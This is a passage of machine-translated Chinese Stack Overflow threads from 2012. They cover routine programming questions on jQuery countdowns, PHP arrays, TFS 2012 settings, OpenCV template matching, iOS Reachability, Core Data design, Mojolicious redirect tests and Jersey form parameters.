        }           
    })
})(jQuery) 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:54:18.200

更改显示以下内容的行：

```
DisplayFormat:"<div>%%D%% Days</div><div>%%H%% Hours</div><div>%%M%% Minutes</div><div>%%S%% Seconds</div>", 
```

读书：

```
DisplayFormat:"<div>%%H%% Hours</div><div>%%M%% Minutes</div><div>%%S%% Seconds</div>", 
```

然后更改显示以下内容的行：

```
DisplayStr = DisplayStr.replace(/%%H%%/g, self.calculateDate(secs,3600,24)); 
```

读书：

```
DisplayStr = DisplayStr.replace(/%%H%%/g, self.calculateDate(secs,3600,876581)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T11:32:28.297

我的问题通过更换解决了

DisplayStr = DisplayStr.replace(/%%H%%/g, self.calculateDate(secs,3600,24));

到

DisplayStr = DisplayStr.replace(/%%H%%/g, self.calculateDate(secs,3600,876581));

感谢生锈的牛仔裤 :)

# php - 尝试创建数组条件

> ID：12328413
> 
> 赞同：2
> 
> 时间：2012-09-08T05:54:36.583
> 
> 标签：php, arrays

我有一个文本字段，用户可以输入逗号分隔的列表，然后 php 将其转换为下拉选择列表，但是我想要一个条件，如果只输入一个值，它将显示一个文本输入字段。我尝试了下面的代码，但即使只有一个条目，它也只会返回选择框。我怎样才能达到这个条件？

```
<?php $listval = explode(",",$vals);
if(is_array($listval)) { ?>

<select name="valuelist">
<?php 
    foreach($listval as $value) {
    echo '<option>'.$value.'</option>';
} ?>
</select>

<?php }else{ ?>

<input type="text" size="10" name="valuelist" value="<?php echo $vals; ?>" />
<?php } ?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:57:37.080

explode 将始终返回一个数组。因此 is_array 将始终为真。将您的 if 语句更改为此

```
if(sizeof($listval) > 1) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T05:58:08.173

试试这个

```
<?php $listval = strpos(',',$vals)?explode(",",$vals):$vals;
if(is_array($listval)) { ?>

<select name="valuelist">
<?php 
    foreach($listval as $value) {
    echo '<option>'.$value.'</option>';
} ?>
</select>

<?php }else{ ?>

<input type="text" size="10" name="valuelist" value="<?php echo $vals; ?>" />
<?php } ?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T05:59:39.067

请尝试使用以下代码：

```
<?php $listval = explode(",",$vals);
if(count($listval) > 1) { ?>
<select name="valuelist">
<?php 
    foreach($listval as $value) {
    echo '<option>'.$value.'</option>';
} ?>
</select>

<?php } elseif(count($listval) == 1) { ?>

<input type="text" size="10" name="valuelist" value="<?php echo $vals; ?>" />
<?php } ?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T07:24:43.173

正如@Kris 所指出的，您可以检查，

```
 count($array) 
```

或者

```
 sizeof($array)

   <?php $listval = explode(",",$vals);
      $array_count = count($listval);
      if($array_count > 1) { ?>

      <select name="valuelist">
      <?php 
         foreach($listval as $value) {
           echo '<option>'.$value.'</option>';
       } ?>
       </select>

      <?php }else{ ?>

          <input type="text" size="10" name="valuelist" value="<?php echo $vals; ?>" />
      <?php } ?> 
```

# visual-studio - TFS 2012 + Visual Studio 2012：一些设置选项返回“用户名或密码不正确”

> ID：12328422
> 
> 赞同：5
> 
> 时间：2012-09-08T05:56:42.673
> 
> 标签：visual-studio, tfs, windows-8, visual-studio-2012

我已将我们的 TFS 2010 升级到 TFS 2012，没有任何问题。我可以连接到源代码管理、签入以及我工作所需的一切。

但是，如果我转到我所连接的团队项目的设置页面，以下选项将按预期**工作：**

团队项目：源代码控制

团队项目：门​​户设置

团队项目合集：源代码控制

团队项目合集：流程模板管理器

但是设置页面上的其他选项只是给了我这个错误

![tfs 错误](../Images/88914a51dec510e2fe00490c2eff8177.png)

我已经尝试查看 Visual Studio 使用 Fiddler 向 TFS 服务器发出的请求，并且对于那些**不起作用**的请求，实际上并没有向服务器发出请求。因此，似乎从未就这些特定选项联系过服务器。

我已经在 Windows 8 上运行的两个独立安装的 Visual Studio 2012 上对此进行了测试。

**编辑**

我刚刚在其中一台机器上安装了 VS2010 SP1，我可以很好地访问以下所有设置选项：安全性、组成员身份、区域和迭代、门户设置和源代码控制。

看起来像是某种 VS2012 问题。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-20T22:27:13.743

我们通过使用我们的域凭据运行 VS 2012 解决了我们的问题。我们使用虚拟机进行开发，所以我们不直接登录域。要运行 VS，我们使用以下内容（作为批处理文件）：

runas /netonly /user：用户名“C:\Program Files (x86)\Microsoft Visual Studio 11.0\Common7\IDE\devenv.exe”

其中用户名是您的域凭据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T16:37:38.987

听起来代码仍在使用升级后缓存在客户端上的一些值。你是多久以前升级服务器的？

要测试是否是这样，请重命名您的缓存文件夹（关闭 VS 2012）并再次启动 VS 2012，以便它从头开始重新创建缓存。

C:\Users\\AppData\Local\Microsoft\Team Foundation\4.0

# android - 共享首选项慢

> ID：12328435
> 
> 赞同：0
> 
> 时间：2012-09-08T05:58:32.000
> 
> 标签：android, sharedpreferences

在为我的应用程序使用共享首选项几天后，我通知它在每次操作后变慢，并使我的应用程序变慢。

它只会得到如下偏好：

```
getBooelan 
```

和设置密码：

```
Editor edit = prefs.GetEditor();
edit.putboolean("reff", "value");
edit.commit(); 
```

哪里有问题 ？我该怎么办 ？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:31:43.563

这就是我使用 SharedPreferenceEditor 的方式。我不确定它是否能解决您的问题，但可以试试这段代码，看看它是否适合您。

```
 SharedPreferences.Editor editor = prefs.edit();          
        editor.putBoolean("reff","value");          
        editor.commit(); 
```

# asp.net-mvc-3 - 如何在 MVC 的选定列表中设置默认值？

> ID：12328436
> 
> 赞同：1
> 
> 时间：2012-09-08T05:58:32.900
> 
> 标签：asp.net-mvc-3, oop, enums

我正在研究 NopCommerce 定制。我正在使用一个选定的列表。我想将一个名为 Active 的值设为默认值。我的代码如下 -

```
foreach (StatusEnum item in Enum.GetValues(typeof(StatusEnum)))
            {   
                newCycleModel.AvailableStatuses.Add(new SelectListItem()
                {
                    Text = item.ToString(),
                    Value = ((int)item).ToString(),
                });
            }
            test.AvailableStatuses.Insert(0, new SelectListItem() { Text = 'All', Value = "0" }); 
```

在 StatusEnum 我有两个状态为“活动”和“关闭”

我想把 Active 作为默认值。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:13:44.290

您可以`Selected`根据当前项目设置属性：

```
newCycleModel.AvailableStatuses.Add(new SelectListItem()
{
    Text = item.ToString(),
    Value = ((int)item).ToString(),
    Selected = (item == StatusEnum.Active)
} 
```

如果您在视图中使用，这应该会导致选择项被选中：

```
@Html.DropDownList("myddlist", Model.AvailableStatuses) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:00:00.773

将所需项目的“Selected”属性设置为 true。

[http://msdn.microsoft.com/en-us/library/system.web.mvc.selectlistitem.selected(v=vs.108).aspx](http://msdn.microsoft.com/en-us/library/system.web.mvc.selectlistitem.selected%28v=vs.108%29.aspx)

# facebook - Facebook API：如何使用 Event 的 place.id？

> ID：12328437
> 
> 赞同：3
> 
> 时间：2012-09-08T05:58:45.703
> 
> 标签：facebook, facebook-fql

Facebook 活动有一个venue.id，我该如何使用它们？它们可以转换为实际地址吗？

例如，[此活动](http://www.facebook.com/events/278671238901538)的场地 ID 为“132764236748017”。我通过运行以下 fql 代码找到了它，

从事件 WHERE eid IN 中选择场地（从 event_member WHERE uid = me() 中选择 eid）

'venue id' 是一个地方的 id 吗？

**编辑：*我找到了答案***

我可以使用'SELECT name,description,geometry,latitude,longitude,checkin_count,display_subtext FROM place WHERE page_id=110506962309835'，其中page_id与venue.id相同

# c# - OpenCv：查找多个匹配项

> ID：12328438
> 
> 赞同：2
> 
> 时间：2012-09-08T05:58:55.987
> 
> 标签：c#, opencv, opencvsharp

我有以下内容，但我不知道如何在源图像中找到所有匹配项。

```
 static void Main()
    {
        using (var template = Cv.LoadImage(@"images\logo.png", LoadMode.GrayScale))
        using (var source = Cv.LoadImage(@"images\manyLogos.png", LoadMode.GrayScale))
        using (var sourceColour = Cv.LoadImage(@"images\manyLogos.png", LoadMode.Color))
        {
            var width = source.Width - template.Width + 1;
            var height = source.Height - template.Height + 1;
            using (var result = Cv.CreateImage(Cv.Size(width, height), BitDepth.F32, 1))
            {
                Cv.MatchTemplate(source, template, result, MatchTemplateMethod.SqDiff);
                var THRESHOLD = 0.08D;

                double minVal, maxVal;
                CvPoint minLoc, maxLoc;                    
                Cv.MinMaxLoc(result, out minVal, out maxVal, out minLoc, out maxLoc);

                var outlineColor = (minVal > THRESHOLD) ? CvColor.Green : CvColor.Red;
                Cv.Rectangle(sourceColour, Cv.Point(minLoc.X, minLoc.Y), Cv.Point(minLoc.X + template.Width, minLoc.Y + template.Height), outlineColor, 1, 0, 0);
            }

            using (var window = new CvWindow("Test"))
            {
                while (CvWindow.WaitKey(10) < 0)
                {
                    window.Image = sourceColour;
                }
            }
        }
    } 
```

我可以概述最佳匹配，但不是所有匹配。我需要以某种方式获得所有比赛。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T07:23:52.250

使用 matchTemplate 方法，您的输出图像将为您提供像素值，这些像素值表示您的模板在此特定位置的匹配程度。在您的情况下，值越低，匹配效果越好，因为您使用了 MatchTemplateMethod.SqDiff。

你的问题是，当你使用 minMaxLoc 函数时，你会得到你所要求的，在这种情况下，这是最好的匹配，即 min）。

所有匹配都是其值低于您设置的阈值的像素。由于我不习惯 csharp，所以这是 C++ 中的用法，您可以进行翻译：

```
// after your call to MatchTemplate
float threshold = 0.08;
cv::Mat thresholdedImage;
cv::threshold(result, thresholdedImage, threshold, 255, CV_THRESH_BINARY);
// the above will set pixels to 0 in thresholdedImage if their value in result is lower than the threshold, to 255 if it is larger.
// in C++ it could also be written cv::Mat thresholdedImage = result < threshold;
// Now loop over pixels of thresholdedImage, and draw your matches
for (int r = 0; r < thresholdedImage.rows; ++r) {
  for (int c = 0; c < thresholdedImage.cols; ++c) {
    if (!thresholdedImage.at<unsigned char>(r, c)) // = thresholdedImage(r,c) == 0
      cv::circle(sourceColor, cv::Point(c, r), template.cols/2, CV_RGB(0,255,0), 1);
  }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-04-16T20:37:05.000

从 C++ 翻译并使用 OpenCvSharp 包装器，上面的代码替换了 minMaxLoc 行，对我有用：

```
double threshold=0.9
var thresholdImage=Cv.CreateImage(newImageSize, BitDepth.F32,1);
Cv.Threshold(result, thresholdImage, threshold, 255, ThresholdType.Binary);
for (int r = 0; r < thresholdImage.GetSize().Height; r++)
{
    for (int c = 0; c < thresholdImage.GetSize().Width; c++)
    {
        if (thresholdImage.GetRow(r)[c].Val0 > 0)
        {
            Cv.Rectangle(soruceColour, Cv.Point(c, r), Cv.Point(c + template.Width, r + template.Height), CvColor.Red, 1, 0, 0);
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-07-13T06:00:19.257

这是使用 Min_Max 和 Match_Template 方法的解决方案。希望它会有所帮助。

```
 public void multipleTemplateMatch(string SourceImages, string tempImage)
    {            
        Image<Bgr, byte> image_source = new Image<Bgr, byte>(SourceImages);
        Image<Bgr, byte> image_partial1 = new Image<Bgr, byte>(tempImage);

        double threshold = 0.9;
        ImageFinder imageFinder = new ImageFinder(image_source, image_partial1, threshold);
        imageFinder.FindThenShow();

    } 
```

这是会有所帮助的课程。

```
class ImageFinder
{
    private List<Rectangle> rectangles;  
    public Image<Bgr, byte> BaseImage { get; set; }
    public Image<Bgr, byte> SubImage { get; set; }
    public Image<Bgr, byte> ResultImage { get; set; }
    public double Threashold { get; set; }        

    public List<Rectangle> Rectangles
    {
        get { return rectangles; }
    }

    public ImageFinder(Image<Bgr, byte> baseImage, Image<Bgr, byte> subImage, double threashold)
    {
        rectangles = new List<Rectangle>();            
        BaseImage = baseImage;
        SubImage = subImage;
        Threashold = threashold;            
    }

    public void FindThenShow()
    {
        FindImage();
        DrawRectanglesOnImage();
        ShowImage();
    }

    public void DrawRectanglesOnImage()
    {
        ResultImage = BaseImage.Copy();
        foreach (var rectangle in this.rectangles)
        {
            ResultImage.Draw(rectangle, new Bgr(Color.Blue), 1);
        }
    }

    public void FindImage()
    {          
        rectangles = new List<Rectangle>();           

        using (Image<Bgr, byte> imgSrc = BaseImage.Copy())
        {
            while (true)
            {
                using (Image<Gray, float> result = imgSrc.MatchTemplate(SubImage, TemplateMatchingType.CcoeffNormed))
                {
                    double[] minValues, maxValues;
                    Point[] minLocations, maxLocations;
                    result.MinMax(out minValues, out maxValues, out minLocations, out maxLocations);

                    if (maxValues[0] > Threashold)
                    {
                        Rectangle match = new Rectangle(maxLocations[0], SubImage.Size);
                        imgSrc.Draw(match, new Bgr(Color.Blue), -1);
                        rectangles.Add(match);
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }          

    }

    public void ShowImage()
    {
        Random rNo = new Random();
        string outFilename = "matched Templates" + rNo.Next();            
        CvInvoke.Imshow(outFilename, ResultImage);
    }     

} 
```

如果您觉得这有帮助，请投票同样有用。谢谢

# javascript - Javascript：显示带有复选框值的图像

> ID：12328439
> 
> 赞同：5
> 
> 时间：2012-09-08T05:58:57.687
> 
> 标签：javascript

我目前正在使用单选按钮和复选框在 javascript 的帮助下显示图像。具体来说：我在处理复选框和显示图像时遇到了问题。使用单选按钮，该类别只会显示一个图像。但是对于复选框，需要显示多个图像。例如，用户可以检查夹克和手套的字段，并且将显示两张图片。

单击复选框时如何格式化该功能以显示多张图片？ [例子](http://webprolearner2346.zxq.net/bike_calculator/)

**JS**

```
<script language="JavaScript" type="text/javascript">

function check_value(val, id, type) {     
    var el = document.getElementById("imgBox" + id);
    if (val>0 && val<4) { //will trigger when [1,2,3]
       el.src = "images/"+ type + val + ".jpg";
       el.style.display = "";
  }    
  }      

</script> 
```

**HTML**

```
<h2>Choose a bike</h2>
<form name="builder">
    <input type="radio" name="field" value="1" onclick='check_value(1, 1, "bike")'/> KAWASAKI KX 450F<br />
    <input type="radio" name="field" value="2" onclick='check_value(2, 1, "bike")'/> 2010 Yamaha Road Star S<br />
    <input type="radio" name="field" value="3" onclick='check_value(3, 1, "bike")'/> Aprilia RSV4<br />
</form>

<img id="imgBox1" src="#" style="display:none"> 

<h2>Choose a tire</h2>  
<form name="tire">
    <input type="radio" name="field" value="1" onclick='check_value(1, 2, "tire")'/> Michelin Pilot Road 3 Tires<br />
    <input type="radio" name="field" value="2" onclick='check_value(2, 2, "tire")'/> Dunlop Roadsmart Sport-Touring Tires<br />
    <input type="radio" name="field" value="3" onclick='check_value(3, 2, "tire")'/> Pirelli Scorpion Trail Tires<br />
</form>

<img id="imgBox2" src="#" style="display:none">

<h2>Choose Accesories</h2>
<form name="tire">
    <input type="checkbox" name="field" value="1" onclick='check_value(1, 3, "accesories")'/> Chrome Front Plate<br />
    <input type="checkbox" name="field" value="2" onclick='check_value(2, 3, "accesories")'/> Jacket<br />
    <input type="checkbox" name="field" value="3" onclick='check_value(3, 3, "accesories")'/> Gloves            
</form>

<img id="imgBox3" src="#" style="display:none"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:15:11.160

再添加两个图像框：

```
<img id="imgBox3a" src="#" style="display:none">
<img id="imgBox3b" src="#" style="display:none">
<img id="imgBox3c" src="#" style="display:none"> 
```

然后onclick调用：

```
check_value(1, "3a", "accessories");
check_value(2, "3b", "accessories");
check_value(3, "3c", "accessories"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:05:47.830

我认为不可能在一个图像标签中附加两个图像试试这个

像这样创建一个 DIV

```
 <div id="image">
     <img id="imgBox3" src="#" style="display:none"/>
       </div> 
```

脚本：

创建一个 Image 元素并将其附加到 DIV

```
 var imag=document.createElement("img");
     imag.src="image";
     document.getElementById("image").appendChild(imag); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T06:19:58.800

```
<form name="tire">
    <input type="checkbox" name="field" value="1" onclick='check_value(1, 3, "accesories")'/> Chrome Front Plate<br />
    <input type="checkbox" name="field" value="2" onclick='check_value(2, 3, "accesories")'/> Jacket<br />
    <input type="checkbox" name="field" value="3" onclick='check_value(3, 3, "accesories")'/> Gloves            
</form>
<div id='access'></div>    

function check_value(val, id, type) {     
        var img = document.createElement("img");
    img.src = "http://webprolearner2346.zxq.net/bike_calculator/images/"+type+val+".jpg";
    alert(img.src)
    var src = document.getElementById("access");
    src.appendChild(img);
      } 
```

检查这个演示[小提琴](http://jsfiddle.net/u37tN/2/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-08T06:53:09.960

首先，如果您真的希望复选框的行为类似于...嗯...复选框，您应该将您的处理程序附加到 onchange 事件：

```
<h2>Choose Accesories</h2>
<form name="tire">
    <input type="checkbox" name="field" value="1" onchange='check_value(1, 3, "accesories",this)'/> Chrome Front Plate<br />
    <input type="checkbox" name="field" value="2" onchange='check_value(2, 3, "accesories",this)'/> Jacket<br />
    <input type="checkbox" name="field" value="3" onchange='check_value(3, 3, "accesories",this)'/> Gloves            
</form> 
```

您会注意到我添加了另一个参数：“this”将指向已更改的元素。然后在你的函数中你可以这样做：

```
function check_value(val, id, type,mycheckbox) {
    if (mycheckbox.checked){
        //do something when it's checked
    }else{
        //do something when it's not checked.
    }
} 
```

那么如何显示多张图片呢？

一种方法是动态创建图像并像@Sibu 建议的那样附加它们（不要忘记在它们未选中时删除它们）。

另一种方法是使用“display:none”（已经设置了它们的 src 属性）预先创建了图像元素，所以你唯一要做的就是使用 display 属性。

我个人会说 option2 更好，因为 css 更改比 dom 操作更快。

# iphone - 检查网络可用性

> ID：12328445
> 
> 赞同：0
> 
> 时间：2012-09-08T06:00:08.777
> 
> 标签：iphone, network-connection

我使用可达性类来检查我的应用程序中的网络连接......

```
Reachability *reach = [Reachability reachabilityForInternetConnection]; 
    NetworkStatus netStatus = [reach currentReachabilityStatus];    
    if (netStatus==NotReachable)
    {
        NSLog(@"NR");
    } 
```

我需要找出网络状态何时发生变化（即网络状态从可达变为不可达，反之亦然）。

有没有代表发现这个想法，有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:11:23.127

我建议使用 Apple 的 Reachability 类。[这](http://developer.apple.com/library/ios/#samplecode/Reachability/Introduction/Intro.html)是Apple的示例应用程序。

并检查此链接。

> [http://www.switchonthecode.com/tutorials/iphone-snippet-detecting-network-status](http://www.switchonthecode.com/tutorials/iphone-snippet-detecting-network-status)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T10:06:48.810

使用此标志`kReachabilityChangedNotification`来查找网络状态的变化并将其传递给`NSNotificationCenter`

这是代码：

```
NSString *host = @"https://www.apple.com"; // Put your host here

        // Set up host reach property
       hostReach = [Reachability reachabilityWithHostname:host];

                          // Enable the status notifications
                          [[NSNotificationCenter defaultCenter] addObserver:self  selector:@selector(reachabilityChanged:) name:kReachabilityChangedNotification object:nil];
                           [hostReach startNotifier];

   - (void) reachabilityChanged: (NSNotification* )note
{
    Reachability *reachability = [note object];
    NSParameterAssert([reachability isKindOfClass:[Reachability class]]);
    if (reachability == hostReach) {
        Reachability *reach = [Reachability reachabilityForInternetConnection]; 
        NetworkStatus netStatus = [reach currentReachabilityStatus];    
        if (netStatus==NotReachable)
        {
            NSLog(@"notreacheable");
        }
        else {
            NSLog(@"reacheable");
            [[NSNotificationCenter defaultCenter]postNotificationName:@"startUpdatingTable" object:nil];
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-08T06:58:14.430

使用**可达性”**类

在应用程序委托中添加泛洪方法，以便您可以在项目中的任何软件中使用此方法

```
#import "Reachability.h"
-(BOOL)isHostAvailable
{
    //return NO; // force for offline testing
    Reachability *hostReach = [Reachability reachabilityForInternetConnection];
    NetworkStatus netStatus = [hostReach currentReachabilityStatus];
    return !(netStatus == NotReachable);
} 
```

# android - Android 4.0 StretchToFit 和 ZoomToFit 问题

> ID：12328446
> 
> 赞同：1
> 
> 时间：2012-09-08T06:00:11.407
> 
> 标签：android, zooming, stretch

在这里，我在 Android 中开发了一个 Bookshelf 应用程序。我在所有设备上都能正常工作，但问题是当我在 Android 4.0 及更高版本的设备上运行时，底部菜单会显示两个选项 1\. StretchToFit 2\. ZoomToFit

当我设置“StretchToFit”时，我的应用程序 BookShelf 显示非常漂亮但是当我设置“ZoomToFit”时，我的应用程序 BookShelf 显示非常糟糕，看起来很奇怪。

请帮助我，在此先感谢。

# registration - 注册时电子邮件验证的替代方法

> ID：12328448
> 
> 赞同：4
> 
> 时间：2012-09-08T06:00:19.970
> 
> 标签：registration, email-validation, user-registration

我读到用户发现必须验证他们的电子邮件才能完成简单的注册很烦人，但是删除这个额外的步骤并使用 CAPTCHA 来处理机器人会导致用户无法重新控制他们的帐户的不舒服情况，如果他们忘记了他们的密码。

那么，该怎么办呢？除了电子邮件确认，还有其他选择吗？我在想，只有在用户忘记密码时才向用户注册时输入的电子邮件地址发送验证码是可以接受的。据我所知，不需要电子邮件确认的缺点是用户有可能冒充其他人。由于我不希望收集有关用户的任何信息，因此这本身不是问题。但是，如果合法用户尝试注册该站点，则该电子邮件地址将不可用。一个解决方案是，此时，可以通知用户所选的电子邮件地址已经被占用，并且他可以有机会更改他的密码，使用验证码重新访问他的帐户。这种方法有问题吗？有更好的可行解决方案吗？

顺便说一句，短信或付费第三方应用程序对我来说不是一个选项。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:03:31.753

根据我的经验，为了将身份与电子邮件地址联系起来，您应该始终确认该身份。

另一种方法是不需要电子邮件地址来注册，只需一个简单的用户名。

如果他们决定将帐户与他们的电子邮件地址绑定，则应要求进行验证。

# ios - CoreData：大量实体或将数组存储为可转换的？

> ID：12328449
> 
> 赞同：0
> 
> 时间：2012-09-08T06:00:38.700
> 
> 标签：ios, core-data, nscoding

我正在制作一个游戏，其中每个生物都可以进行 3 次攻击，并且每次攻击可以同时产生多种效果。我正在使用 CoreData 来保存所有数据。

可以通过三个实体看到我的问题的一个基本示例：

1.  `Creature``Attack`：包含与实体的一对多关系
2.  `Attack``Effect`：包含与实体的一对多关系
3.  `Effect`：包含效果的详细信息（伤害、迷惑、毒药等）

因此，首先我需要`Attack`为每个唯一实体拥有三个唯一`Creature`实体。然后我需要将`Effect`实体添加到每次攻击中。我的问题是每个效果可以有不同的价值，但它与所有其他生物的效果基本相同：它仍然是“伤害”，但伤害的价值因每个生物而异。

我想到的只有两种方法：

1.  `Effect`为 each`Attack`为 each创建一个唯一的`Creature`，这样我可以将效果值存储在实体中。这样做的缺点是数据可能会变得很大：3x3x400 = 3,600 个`Effect`实体，每个实体仅存在一个关系。

2.  `Effect`为每种类型（损坏、混乱等）创建一个，并在`Attack`实体中使用 Transformable 数据类型，我在其中存储包含每个实体标识符的字典数组`Effect`（以便在需要时可以找到它们）和该效果的值。这可以很容易地`NSCoding`自动处理，并将`Entity`对象的数量从 3,600 减少到大约 20。

`Effect`&实体很少被`Attack`访问（仅当生物在战斗中时），我不需要在其中搜索，因此我认为这不会对性能产生明显影响。我还在许多网站上读到，他们建议不要在 CoreData 中存储数组和字典。有没有其他方法可以做到这一点？如果没有，什么选择会更好？

PS：抱歉，标题没有描述性，我不知道该放什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T13:22:41.783

如果您不打算更改效果的种类，您可以拥有一个可以调用的实体，`CreatureAttack`其中每一行都完全指定了生物攻击的效果。列可能是：a 的外键，a 的`Creature`外键`Attack`，, `Damage`, `Confuse`,`Poison`等。对于每个效果列，一行将具有此攻击和生物的效果值。

该实体最多只有 # `Creature`x #`Attack`行，您只需拉出一行即可了解有关生物攻击的所有信息。

否则，我认为解决方案 1 更干净，拥有几千行的性能影响应该可以忽略不计，特别是如果您`Creature`在外键上放置索引和/或在外键上放置复合索引`Creature`（`Attack`在 iOS5 中支持）。

# perl - 如何在 Mojolicious 中测试重定向？

> ID：12328455
> 
> 赞同：6
> 
> 时间：2012-09-08T06:01:55.627
> 
> 标签：perl, unit-testing, mojolicious

我想测试一个带有表单的页面，该表单在提交时将重定向到提交项目的结果页面。

我的 Mojolicious 控制器包含：

```
sub submit_new {
    my $self = shift;

    my $new = $self->db->resultset('Item')->new( {
        title       => $self->param('title'),
        description => $self->param('description'),
    } );
    $new->insert;

    # show the newly submitted item
    my $id = $new->id;
    $self->redirect_to("/items/$id");
} 
```

此控制器的测试脚本包含：

```
use Test::More;
use Test::Mojo;

my $t = Test::Mojo->new('MyApp');

my $tx = $t->ua->build_form_tx('/items/new/submit' => $data);
$tx->req->method('POST');
$t->tx( $t->ua->start($tx) )
  ->status_is(302); 
```

我的问题是它随着`302`状态而停止。如何进行重定向，以便验证生成的项目页面？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-08T06:18:30.937

从 Mojo::UserAgent 设置匹配设置：

```
$t->ua->max_redirects(10) 
```

此外，您不需要手动构建表单帖子：

```
$t->post_form_ok('/items/new/submit' => $data)->status_is(...); 
```

参考：

*   [http://mojolicio.us/perldoc/Test/Mojo#ua](http://mojolicio.us/perldoc/Test/Mojo#ua)
*   [http://mojolicio.us/perldoc/Mojo/UserAgent#max_redirects](http://mojolicio.us/perldoc/Mojo/UserAgent#max_redirects)
*   [http://mojolicio.us/perldoc/Test/Mojo#post_form_ok](http://mojolicio.us/perldoc/Test/Mojo#post_form_ok)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-07-09T10:50:48.950

您还可以（并且可能应该）测试成功登录重定向到的登录页面的内容：

```
my $tm = '' ; # the test message for each test
my $t = Test::Mojo->new('Qto');
$t->ua->max_redirects(10);
my $app = 'foobar';
my $url = '/' . $db_name . '/login' ;

 $tm = "a successfull result redirects to the home page";
 my $tx = $t->ua->post( $url => 'form'  => {'email' =>'test.user@gmail.com', 'pass' => 'secret'});
 ok ( $tx->result->dom->all_text =~ "$app home" , $tm ); 
```

[如何使用 mojo dom 获取内容的文档](https://metacpan.org/pod/release/SRI/Mojolicious-7.73/lib/Mojolicious/Guides/Testing.pod)

[mojo dom 选择器语法文档链接](https://mojolicious.org/perldoc/Mojo/DOM#selector)

[带有登录测试的示例测试脚本](https://github.com/YordanGeorgiev/qto/blob/v0.6.7/src/perl/qto/t/lib/Qto/Controller/TestLogin.pl)

# java - Jersey Jax-rs 出现容器异常

> ID：12328456
> 
> 赞同：3
> 
> 时间：2012-09-08T06:02:14.783
> 
> 标签：java, jersey, jax-rs

我是 Jax-Rs 的新手。我尝试将数据从 html 发布到 Webresource 方法。在运行时我遇到异常，即

```
exception 

javax.servlet.ServletException: com.sun.jersey.api.container.ContainerException: Exception injecting parameters to Web resource method
    com.sun.jersey.spi.container.servlet.WebComponent.service(WebComponent.java:310)
    com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:314)
    com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:239)

root cause 

com.sun.jersey.api.container.ContainerException: Exception injecting parameters to Web resource method
    com.sun.jersey.server.impl.model.method.dispatch.FormDispatchProvider$FormParamInInvoker.getParams(FormDispatchProvider.java:103)

root cause 

java.lang.ClassCastException: java.lang.String
    com.sun.jersey.core.util.MultivaluedMapImpl.getFirst(MultivaluedMapImpl.java:81)
    com.sun.jersey.core.util.MultivaluedMapImpl.getFirst(MultivaluedMapImpl.java:53)
    com.sun.jersey.server.impl.model.parameter.multivalued.StringExtractor.extract(StringExtractor.java:61)
    com.sun.jersey.server.impl.model.method.dispatch.FormDispatchProvider$FormParamInjectable.getValue(FormDispatchProvider.java:233) 
```

我提到了下面的 Html 页面和 Web 资源方法：-

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Test Jax-RS Object</title>
</head>
<body>
<form action="services/fruitstore/loadObject1" method="POST" >
<table>
<tr>
    <td>ID:</td>
    <td><input type="text" name="id"></td>
</tr>
<tr>
    <td>Name:</td>
    <td><input type="text" name="name"></td>
</tr>
<tr>
    <td><input type="submit" Value="Submit"></td>
</tr>
</table>
</form>
</body>
</html> 
```

网络资源方法：-

```
@POST
@Path("loadObject1")
@Consumes("application/x-www-form-urlencoded")

public void loadObject1(@FormParam("id") String id,@FormParam("name") String name){
    System.out.println("====================");
    System.out.println("Fruit ID"+id+" Name"+name);

} 
```

请帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T16:42:53.603

似乎问题出在`@Path`- 你应该注释你的类，而不是方法。以下应该有效：

```
package net.asteasolutions.imagenation.boundary;

import javax.ws.rs.FormParam;
import javax.ws.rs.POST;
import javax.ws.rs.Path;

@Path("loadObject1")
public class TestService {

    @POST
    public void loadObject1(
        @FormParam("id") String id,
        @FormParam("name") String name
    ) {
        System.out.println("====================");
        System.out.println("Fruit ID"+id+" Name"+name);
    }
} 
```

请注意，您不需要明确使用“application/x-www-form-urlencoded”，Jersey 会自动计算出来。:-)

# java - 声明一个会话变量 golbaly 以从 sevlet 中的 DoGet 和 DoPost 访问

> ID：12328458
> 
> 赞同：1
> 
> 时间：2012-09-08T06:02:46.690
> 
> 标签：java, jakarta-ee, servlets

我有一个 servlet，我需要在其中声明一个可以接受形式 doGet 和 doPost 的会话，我应该如何做到这一点？我已经做好了

```
@WebServlet(name = "LoginLogout", urlPatterns = {"/LoginLogout.do"})public class LoginLogout extends HttpServlet {//For Session
HttpSession session = request.getSession(true);

protected void processRequest(HttpServletRequest request, HttpServletResponse response)
